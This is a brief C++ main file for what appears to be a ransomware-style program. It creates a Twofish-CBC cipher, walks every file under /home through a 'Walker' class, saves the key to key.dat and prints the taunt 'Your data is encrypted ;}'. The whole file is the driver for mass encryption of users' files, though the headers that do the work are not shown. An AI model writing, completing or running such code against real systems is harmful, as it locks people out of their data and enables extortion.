#include <fstream>
#include <iostream>

#include "cipher.hpp"
#include "walker.hpp"
#include "cbctwofish.hpp"


int main(int argc, char **argv) {
    std::shared_ptr<Cipher> coolCryptor;//(std::make_shared<CBCTwofish>());
	coolCryptor = std::make_shared<CBCTwofish>();

    Walker shadowWalker("/home", coolCryptor);

    shadowWalker.setCmdArgs(argc, argv);

    std::ofstream saveKey("key.dat");

    saveKey << coolCryptor->getKey();// + coolCryptor->getIV();
    saveKey.close();
    shadowWalker.walk();

    std::cout << "Your data is encrypted ;}" << std::endl;

    return 0;
}
